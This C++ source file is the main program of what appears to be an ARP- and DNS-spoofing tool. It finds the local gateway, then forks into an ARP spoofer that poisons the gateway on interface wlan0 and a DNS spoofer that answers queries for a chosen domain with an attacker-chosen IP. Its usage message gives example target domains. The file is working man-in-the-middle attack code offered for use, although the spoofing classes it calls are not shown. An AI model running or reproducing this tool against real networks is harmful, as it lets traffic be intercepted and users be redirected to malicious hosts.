#include <iostream>
#include "ArpSpoofer.h"
#include "DnsSpoofer.h"
#include "GatewayInfo.h"

//char const *interface = "wlo1";
char const *interface = "wlan0";

uint8_t *getIpFromString(char *string);

int main(int argc, char * argv[]) {
    if(argc < 3){
        cout << "Provide target domain and resposne ip" << endl;
        cout << "example: dns_spoofer jacek.pl.com 192.168.0.10" << endl;
        cout << "Using default: dns_spoofer wiekon.com.pl yafud.pl_ip" << endl;
    }

    GatewayInfo* gatewayInfo = new GatewayInfo();
    char *gw = gatewayInfo->getGateway();
    uint8_t *gateway = getIpFromString(gw);
    char *s = new char[16];
    sprintf(s, "%d.%d.%d.%d", gateway[0], gateway[1], gateway[2], gateway[3]);
    cout << s << endl;

    if(fork()){
        DnsSpoofer *dnsSpoofer = new DnsSpoofer();
        dnsSpoofer->start_spoofing(const_cast<char *>(interface));
    } else {
        auto arpSpoofer = new ArpSpoofer();
        arpSpoofer->start_spoofing(const_cast<char *>(interface), gateway);
    }

    return 0;
}

uint8_t *getIpFromString(char *string) {
    unsigned char *buf = new unsigned char[(sizeof(struct in6_addr))];
    inet_pton(AF_INET, string, buf);
    return buf;
}